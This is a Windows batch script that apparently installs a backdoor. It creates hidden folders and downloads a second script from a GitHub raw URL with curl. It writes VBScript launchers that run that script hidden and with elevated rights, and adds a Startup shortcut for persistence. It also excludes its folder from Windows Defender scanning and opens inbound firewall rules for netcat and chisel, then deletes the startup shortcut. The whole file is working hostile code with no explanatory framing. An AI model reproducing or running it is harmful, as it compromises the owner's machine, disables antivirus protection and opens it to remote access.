@echo off
mkdir %homedrive%\A7uma
attrib +h %homedrive%\A7uma
mkdir %homedrive%\ShiniGami
attrib +h %homedrive%\ShiniGami
cd %homedrive%\ShiniGami
C:\curl\bin\curl.exe -O https://raw.githubusercontent.com/l-urk/A7uma/main/A7uma.bat
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\A7uma\死神.vbs
echo objShell.Run "%homedrive%\ShiniGami\A7uma.bat", 0, False >> %homedrive%\A7uma\死神.vbs
echo Set objShell = CreateObject("Shell.Application") >> %homedrive%\A7uma\beyondbirthday.vbs
echo objShell.ShellExecute "%homedrive%\A7uma\beyondbirthday.bat", "", "", "runas", 0 >> %homedrive%\A7uma\beyondbirthday.vbs
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\A7uma\beyondbirthday.vbs';$s.Save()"
echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\A7uma" >> %homedrive%\A7uma\beyondbirthday.bat
echo powershell Remove-NetFirewallRule -Name "A7umanc" >> %homedrive%\A7uma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "A7umanc" -Direction Inbound -Program "%homedrive%\A7uma\nc\nc.exe" -Action Allow >> %homedrive%\A7uma\beyondbirthday.bat
echo powershell Remove-NetFirewallRule -Name "A7umachisel" >> %homedrive%\A7uma\beyondbirthday.bat
echo powershell New-NetFirewallRule -DisplayName "A7umachisel" -Direction Inbound -Program "%homedrive%\A7uma\chisel.exe" -Action Allow >> %homedrive%\A7uma\beyondbirthday.bat
echo start %homedrive%\A7uma\死神.vbs >> %homedrive%\A7uma\beyondbirthday.bat
echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\A7uma\beyondbirthday.bat
echo del "beyondbirthday.lnk" >> %homedrive%\A7uma\beyondbirthday.bat
set "vbsFilePath=%homedrive%\A7uma\beyondbirthday.vbs"
IF EXIST "%vbsFilePath%" (
    cscript "%vbsFilePath%"
) ELSE (
    exit
)
